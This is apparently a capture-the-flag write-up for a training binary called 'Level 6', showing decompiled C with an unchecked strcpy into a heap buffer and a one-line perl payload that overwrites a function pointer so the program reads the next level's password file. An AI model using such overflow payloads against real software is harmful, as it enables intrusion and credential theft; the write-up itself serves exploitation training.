# Level 6

## the code:

decompiled with Hex-Rays (https://dogbolt.org/)

```c
//----- (08048454) --------------------------------------------------------
int n()
{
  return system("/bin/cat /home/user/level7/.pass");
}

//----- (08048468) --------------------------------------------------------
int m()
{
  return puts("Nope");
}

//----- (0804847C) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int (**v4)(void); // [esp+18h] [ebp-8h]
  char *v5; // [esp+1Ch] [ebp-4h]

  v5 = (char *)malloc(0x40u);
  v4 = (int (**)(void))malloc(4u);
  *v4 = m;
  strcpy(v5, argv[1]);
  return (*v4)();
}
```

## the goal:

replace m() by n() in v4. Therefore we will overflow v5.

## the hack:

```sh
$ ./level6 $(perl -e 'print"\x54\x84\x04\x08" x 19')
```
